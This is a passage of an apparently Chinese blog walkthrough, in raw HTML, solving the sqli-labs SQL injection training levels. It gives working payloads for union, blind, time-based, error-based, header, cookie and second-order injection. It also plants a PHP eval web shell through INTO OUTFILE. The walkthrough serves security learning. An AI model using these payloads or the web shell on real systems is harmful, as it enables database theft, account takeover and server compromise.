class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">group_concat</span>(column_name),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name= <span class="hljs-string">'users'</span><span class="hljs-comment">#   //得到列名</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-number">-1</span><span class="hljs-string">' union select 1,username,password from users where id=3#     //爆破得到数据</span></span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h3><p>在添加’之后，得到返回<br></p><figure class="highlight routeros hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an <span class="hljs-builtin-name">error</span> <span class="hljs-keyword">in</span> your SQL syntax; check the<span class="hljs-built_in"> manual </span>that corresponds <span class="hljs-keyword">to</span> your MySQL<span class="hljs-built_in"> server </span>version <span class="hljs-keyword">for</span> the right syntax <span class="hljs-keyword">to</span> use near <span class="hljs-string">''</span> LIMIT 0,1<span class="hljs-string">' at line 1</span></span><br></pre></td></tr></tbody></table></figure><br>可以得到这个sql语句其实并没有单引号，只是用数字进行查询，例如<br><figure class="highlight routeros hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * <span class="hljs-keyword">from</span><span class="hljs-built_in"> users </span>where <span class="hljs-attribute">id</span>=1</span><br></pre></td></tr></tbody></table></figure><br>所以我们也可以跟上面一样，payloads:<br><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 or 1=1%23</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h3><p>添加’之后，返回<br></p><figure class="highlight routeros hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an <span class="hljs-builtin-name">error</span> <span class="hljs-keyword">in</span> your SQL syntax; check the<span class="hljs-built_in"> manual </span>that corresponds <span class="hljs-keyword">to</span> your MySQL<span class="hljs-built_in"> server </span>version <span class="hljs-keyword">for</span> the right syntax <span class="hljs-keyword">to</span> use near <span class="hljs-string">''</span>1<span class="hljs-string">''</span>) LIMIT 0,1<span class="hljs-string">' at line 1</span></span><br></pre></td></tr></tbody></table></figure><br>可以得到大概的sql语句:<br><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">id</span>=(<span class="hljs-string">'input'</span>) <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>;</span><br></pre></td></tr></tbody></table></figure><p></p><p>所以我们可以需要闭合)。</p><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1') or 1=1%23</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h3><p>尝试’并未发现报错，尝试”发现报错<br></p><figure class="highlight routeros hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an <span class="hljs-builtin-name">error</span> <span class="hljs-keyword">in</span> your SQL syntax; check the<span class="hljs-built_in"> manual </span>that corresponds <span class="hljs-keyword">to</span> your MySQL<span class="hljs-built_in"> server </span>version <span class="hljs-keyword">for</span> the right syntax <span class="hljs-keyword">to</span> use near <span class="hljs-string">'"1"") LIMIT 0,1'</span> at line 1</span><br></pre></td></tr></tbody></table></figure><br>可以得到大概的sql语句<br><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">id</span> = (<span class="hljs-string">"input"</span>) <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>;</span><br></pre></td></tr></tbody></table></figure><br>所以payload:<br><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1") or 1=1 %23</span><br></pre></td></tr></tbody></table></figure><br>其他注入语句同上 ，就不再一一列举了。<p></p><h3 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h3><p>尝试’发现报错<br></p><figure class="highlight routeros hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an <span class="hljs-builtin-name">error</span> <span class="hljs-keyword">in</span> your SQL syntax; check the<span class="hljs-built_in"> manual </span>that corresponds <span class="hljs-keyword">to</span> your MySQL<span class="hljs-built_in"> server </span>version <span class="hljs-keyword">for</span> the right syntax <span class="hljs-keyword">to</span> use near <span class="hljs-string">''</span>1<span class="hljs-string">''</span> LIMIT 0,1<span class="hljs-string">' at line 1</span></span><br></pre></td></tr></tbody></table></figure><br>猜测sql语句为<br><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">id</span>=<span class="hljs-string">'input'</span> <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>;</span><br></pre></td></tr></tbody></table></figure><br>如果尝试之前的注入方法，会发现不再会返回我们注入的信息，如果注入成功的话，页面会返回<code>You are in...</code>，出错的话就不会返回这个字符串，所以这里我们可以进行盲注。<p></p><h4 id="使用left"><a href="#使用left" class="headerlink" title="使用left()"></a>使用left()</h4><p>例如我们可以使用<code>1' and left(version(),1)=3%23</code>这个payload进行测试，截取<code>version()</code>得到的最左侧的字符判断是否为3，如果为3则正常返回<code>You are in...</code>，否则不返回。所以我们可以利用这个一步一步爆破得到<code>left(version(),1)=5</code>。爆破区间可以确定在<code>/[0-9.]/</code>。</p><p>采用<code>1'and length(database())=8%23</code>对数据库名字长度进行爆破，确定数据库名字长度之后，我们可以使用<code>database()</code>来进行爆破数据库名，采用<code>left(database(),1)&gt;'a'</code>这个payload进行测试，原理跟上述一致，看返回即可，直到截取长度与数据库名字一致为止，这里效率比较高的就是采用二分法进行盲注。</p><h4 id="使用substr-、ascii"><a href="#使用substr-、ascii" class="headerlink" title="使用substr()、ascii()"></a>使用substr()、ascii()</h4><p>也可以采用substr()、ascii()函数进行尝试:<br></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1' and ascii(substr((<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">80</span>%<span class="hljs-number">23</span>     //截取数据库下第一个表的第一个字符与<span class="hljs-number">80</span><span class="hljs-keyword">ascii</span>值进行对比</span><br><span class="line"></span><br><span class="line">找第二个字符只需要改成<span class="hljs-keyword">substr</span>(<span class="hljs-string">'xxx'</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>)即可。</span><br><span class="line">找第二个表改成<span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span></span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="使用regexp"><a href="#使用regexp" class="headerlink" title="使用regexp()"></a>使用regexp()</h4><p></p><figure class="highlight hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1' and 1=(<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">'users'</span> <span class="hljs-keyword">and</span> column_name regexp <span class="hljs-string">'^us[a-z]'</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>;)%23</span><br><span class="line">//users表中的列名是否有us**的列</span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="使用ord-、mid"><a href="#使用ord-、mid" class="headerlink" title="使用ord()、mid()"></a>使用ord()、mid()</h4><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1' and ORD(MID((<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">IFNULL</span>(<span class="hljs-keyword">CAST</span>(username <span class="hljs-keyword">AS</span> <span class="hljs-built_in">CHAR</span>),<span class="hljs-number">0x20</span>)<span class="hljs-keyword">FROM</span> security.users <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> <span class="hljs-keyword">id</span> <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))= <span class="hljs-number">68</span>%<span class="hljs-number">23</span></span><br><span class="line">//<span class="hljs-keyword">cast</span>(username <span class="hljs-keyword">AS</span> <span class="hljs-built_in">CHAR</span>)将username转换成字符串</span><br><span class="line">//<span class="hljs-keyword">IFNULL</span>(exp1,exp2)假如expr1不为<span class="hljs-literal">NULL</span>，则<span class="hljs-keyword">IFNULL</span>()的返回值为expr1; 否则其返回值为expr2。IFNULL()的返回值是数字或是字符串，具体情况取决于其所使用的语境。</span><br><span class="line">//ord前文提过</span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="使用报错注入"><a href="#使用报错注入" class="headerlink" title="使用报错注入"></a>使用报错注入</h4><p>推荐一篇超详细的讲解报错注入的文章——<a href="https://www.cnblogs.com/xdans/p/5412468.html" target="_blank" rel="noopener">Mysql报错注入原理分析(count()、rand()、group by)</a></p><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1' union <span class="hljs-keyword">Select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">count</span>(*),<span class="hljs-keyword">concat</span>(<span class="hljs-number">0x3a</span>,<span class="hljs-number">0x3a</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()),<span class="hljs-number">0</span></span><br><span class="line">x3a,<span class="hljs-number">0x3a</span>,<span class="hljs-keyword">floor</span>(<span class="hljs-keyword">rand</span>(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>))a <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a<span class="hljs-comment">--+</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-number">1</span><span class="hljs-string">' union select 1,count(*) ,concat((select user()),floor(rand(0)*2))x from security.users group by x#</span></span><br><span class="line"><span class="hljs-string"></span></span><br><span class="line"><span class="hljs-string">1'</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> (!(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())x) - ~<span class="hljs-number">0</span>),<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-comment">--+</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-number">1</span><span class="hljs-string">' and extractvalue(1,concat(0x7e,(select @@version),0x7e)) --+</span></span><br><span class="line"><span class="hljs-string"></span></span><br><span class="line"><span class="hljs-string">1'</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,<span class="hljs-keyword">concat</span>(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> @@<span class="hljs-keyword">version</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>) <span class="hljs-comment">--+</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-number">1</span><span class="hljs-string">' union select 1,2,3 from (select NAME_CONST(version(),1), NAME_CONST(version(),1))x --+</span></span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="使用延时注入"><a href="#使用延时注入" class="headerlink" title="使用延时注入"></a>使用延时注入</h4><p>benchmark 是Mysql的一个内置函数,其作用是来测试一些函数的执行速度。 benchmark() 中带有两个参数，第一个是执行的次数，第二个是要执行的函数或者是表达式</p><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1'and If(ascii(substr(database(),1,1))=115,1,sleep(5))<span class="hljs-comment">--+</span></span><br><span class="line"></span><br><span class="line">1'UNION <span class="hljs-keyword">SELECT</span> (<span class="hljs-keyword">IF</span>(<span class="hljs-keyword">SUBSTRING</span>(<span class="hljs-keyword">current</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)=<span class="hljs-built_in">CHAR</span>(<span class="hljs-number">115</span>),<span class="hljs-keyword">BENCHMARK</span>(<span class="hljs-number">50000000</span>,<span class="hljs-keyword">ENCODE</span>(<span class="hljs-string">'MSG'</span>,<span class="hljs-string">'by 5 seconds'</span>)),<span class="hljs-literal">null</span>)),<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">FROM</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>() <span class="hljs-keyword">as</span> <span class="hljs-keyword">current</span>) <span class="hljs-keyword">as</span> tb1<span class="hljs-comment">--+</span></span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h3><p>没有回显，可以使用布尔盲注</p><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1" and ascii(substr((<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">100</span><span class="hljs-comment">--+</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>可以发现<code>&gt;100</code>有回显，小于就没有，也可以用报错注入…</p><p>这里就是把Less-5 中的<code>'</code>改成<code>"</code>就行了</p><h3 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h3><p>使用文件导出</p><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1'))UNION <span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">into</span> <span class="hljs-keyword">outfile</span> <span class="hljs-string">"c:\\wamp\\www\\sqlli b\\Less-7\\uuu.txt"</span>%<span class="hljs-number">23</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-number">1</span><span class="hljs-string">'))UNION SELECT 1,2,'</span>&lt;?php @eval($_post[“mima”])?&gt;<span class="hljs-string">' into outfile "c:\\wamp\\www\\sqllib\\Less-7\\yijuhua.php"--+</span></span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h3><p>可以使用时间盲注，也可以用 bool 盲注</p><p></p><figure class="highlight hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' and If(ascii(substr(database(),1,1))&gt;115,1,sleep(5))--+</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h3><p>同 Less-8 可以使用时间盲注</p><p></p><figure class="highlight hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' and If(ascii(substr(database(),1,1))&gt;115,1,sleep(5))--+</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h3><p></p><figure class="highlight hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1" and If(ascii(substr(database(),1,1))&gt;115,1,sleep(5))--+</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h3><p>报错注入，少一列就行了</p><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1' union <span class="hljs-keyword">Select</span> <span class="hljs-keyword">count</span>(*),<span class="hljs-keyword">concat</span>(<span class="hljs-number">0x3a</span>,<span class="hljs-number">0x3a</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(schema_name) <span class="hljs-keyword">from</span> information_schema.schemata),<span class="hljs-number">0x3a</span>,<span class="hljs-number">0x3a</span>,<span class="hljs-keyword">floor</span>(<span class="hljs-keyword">rand</span>(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>))a <span class="hljs-keyword">from</span> information_schema.schemata <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a<span class="hljs-comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-number">1</span><span class="hljs-string">' union select count(*),concat((select user()),floor(rand(0)*2))x from information_schema.columns group by x#</span></span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h3><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1") union <span class="hljs-keyword">Select</span> <span class="hljs-keyword">count</span>(*),<span class="hljs-keyword">concat</span>(<span class="hljs-number">0x3a</span>,<span class="hljs-number">0x3a</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(schema_name) <span class="hljs-keyword">from</span> information_schema.schemata),<span class="hljs-number">0x3a</span>,<span class="hljs-number">0x3a</span>,<span class="hljs-keyword">floor</span>(<span class="hljs-keyword">rand</span>(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>))a <span class="hljs-keyword">from</span> information_schema.schemata <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a<span class="hljs-comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-number">1</span><span class="hljs-string">") union select count(*),concat((select user()),floor(rand(0)*2))x from information_schema.columns group by x#</span></span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h3><p></p><figure class="highlight lsl hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-number">1</span>') or <span class="hljs-number">1</span>=<span class="hljs-number">1</span>#</span><br></pre></td></tr></tbody></table></figure><p></p><p>成功登录，报错注入成功但是不回显，可以考虑盲注</p><p></p><figure class="highlight lsl hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-number">1</span>') or ascii(substr((database()),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">100</span>#</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h3><p></p><figure class="highlight 1c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-number">1</span><span class="hljs-string">" or 1=1#</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>成功登录，依然不能回显，尝试使用布尔盲注</p><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1" or left(database(),1)='s'<span class="hljs-comment">#</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>发现可以用<code>updatexml</code>进行报错注入</p><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1" and updatexml(1,concat(0x7e,(<span class="hljs-keyword">select</span> @@<span class="hljs-keyword">version</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">#</span></span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h3><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' or 1=1<span class="hljs-comment">#</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>成功登录，布尔注入或者时间盲注均可行</p><p></p><figure class="highlight hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1' or left(database(),1)='s'<span class="hljs-comment">#</span></span><br><span class="line">admin' and If(ascii(substr(database(),1,1))&gt;115,1,sleep(5))#</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h3><p></p><figure class="highlight 1c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-number">1</span><span class="hljs-string">") or 1=1#</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>成功登录，布尔注入或者时间盲注均可行</p><p></p><figure class="highlight hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1") or left(database(),1)='s'<span class="hljs-comment">#</span></span><br><span class="line">admin") and If(ascii(substr(database(),1,1))&gt;115,1,sleep(5))#</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h3><p><code>update</code>注入，<code>username</code>过滤了很多，有<code>password</code>错误回显，考虑用报错注入</p><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' and updatexml(1,concat(0x7e,(<span class="hljs-keyword">select</span> @@<span class="hljs-keyword">version</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">#</span></span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h3><p>登录成功后，页面提示</p><p></p><figure class="highlight routeros hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Your<span class="hljs-built_in"> IP ADDRESS </span>is: 172.17.0.1</span><br><span class="line">Your<span class="hljs-built_in"> User </span>Agent is: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:65.0) Gecko/20100101 Firefox/65.0</span><br></pre></td></tr></tbody></table></figure><p></p><p>那么有可能是 ip 或者 UA 注入，看了一下发现是个 Header 头注入，这里需要注意这是登录成功的条件下才能触发的，而且既然是<code>insert</code>注入，需要用<code>'1'='1</code>闭合后面的 sql 语句，否则就是语法错误了</p><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">' and updatexml(1,concat(0x7e,(<span class="hljs-keyword">select</span> @@<span class="hljs-keyword">version</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>) <span class="hljs-keyword">and</span> <span class="hljs-string">'1'</span>=<span class="hljs-string">'1</span></span><br><span class="line"><span class="hljs-string">'</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,<span class="hljs-keyword">concat</span>(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> @@<span class="hljs-keyword">version</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>),<span class="hljs-string">"1"</span>,<span class="hljs-string">"1"</span>)<span class="hljs-comment">#</span></span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h3><p>登录成功后提示</p><p></p><figure class="highlight angelscript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Your IP ADDRESS <span class="hljs-keyword">is</span>: <span class="hljs-number">172.17</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span></span><br><span class="line">Your Referer <span class="hljs-keyword">is</span>: http:<span class="hljs-comment">//localhost:8081/Less-19/</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>于是我们可以知道是在<code>Referer</code>应该有注入点，在 Referer 处同样用</p><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' and updatexml(1,concat(0x7e,(<span class="hljs-keyword">select</span> @@<span class="hljs-keyword">version</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>) <span class="hljs-keyword">and</span> <span class="hljs-string">'1'</span>=<span class="hljs-string">'1</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>可以注入</p><h3 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h3><p>cookie 注入，登录成功后修改 cookie 即可</p><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' and updatexml(1,concat(0x7e,(<span class="hljs-keyword">select</span> @@<span class="hljs-keyword">version</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>) <span class="hljs-keyword">and</span> <span class="hljs-string">'1'</span>=<span class="hljs-string">'1</span></span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Less-21"><a href="#Less-21" class="headerlink" title="Less-21"></a>Less-21</h3><p>登录成功后发现 cookie 加上了 base64</p><p></p><figure class="highlight nix hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YOUR COOKIE : <span class="hljs-attr">uname</span> = <span class="hljs-attr">YWRtaW4=</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>用上面的 payload 进行 base64 编码就行了，记得<code>=</code>要 urlencode</p><p></p><figure class="highlight gcode hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JyBhbmQgdXBkYXRle<span class="hljs-name">G1</span>sKDEsY<span class="hljs-number">29</span>uY<span class="hljs-number">2</span>F<span class="hljs-number">0</span>KDB<span class="hljs-number">4</span><span class="hljs-symbol">N2</span>UsKH<span class="hljs-symbol">NlbGVjdCBAQHZlcnNpb24</span>pLDB<span class="hljs-number">4</span><span class="hljs-symbol">N2</span>UpLDEpIGFuZCA<span class="hljs-symbol">nMSc9</span>JzE<span class="hljs-meta">%</span><span class="hljs-number">3</span>d</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Less-22"><a href="#Less-22" class="headerlink" title="Less-22"></a>Less-22</h3><p>同 21 ，单引号换成双引号即可</p><p></p><figure class="highlight gcode hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IiBhbmQgdXBkYXRle<span class="hljs-name">G1</span>sKDEsY<span class="hljs-number">29</span>uY<span class="hljs-number">2</span>F<span class="hljs-number">0</span>KDB<span class="hljs-number">4</span><span class="hljs-symbol">N2</span>UsKH<span class="hljs-symbol">NlbGVjdCBAQHZlcnNpb24</span>pLDB<span class="hljs-number">4</span><span class="hljs-symbol">N2</span>UpLDEpIGFuZCAiMSI<span class="hljs-number">9</span>IjE<span class="hljs-meta">%</span><span class="hljs-number">3</span>d</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Less-23"><a href="#Less-23" class="headerlink" title="Less-23"></a>Less-23</h3><p>这里<code>#</code>、<code>--+</code>均被过滤了，但是我们可以利用<code>or "1"="1</code>来闭合后面的双引号也可以达到我们的目的</p><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1' and updatexml(1,concat(0x7e,(<span class="hljs-keyword">select</span> @@<span class="hljs-keyword">version</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>) <span class="hljs-keyword">or</span> <span class="hljs-string">'1'</span>=<span class="hljs-string">'1</span></span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Less-24"><a href="#Less-24" class="headerlink" title="Less-24"></a>Less-24</h3><p>这里是个二次注入，我们可以先注册一个<code>admin'#</code>的账号，在修改密码处我们就可以以自己的密码修改 admin 的密码了，因为修改密码处形成的 sql 语句是</p><p></p><figure 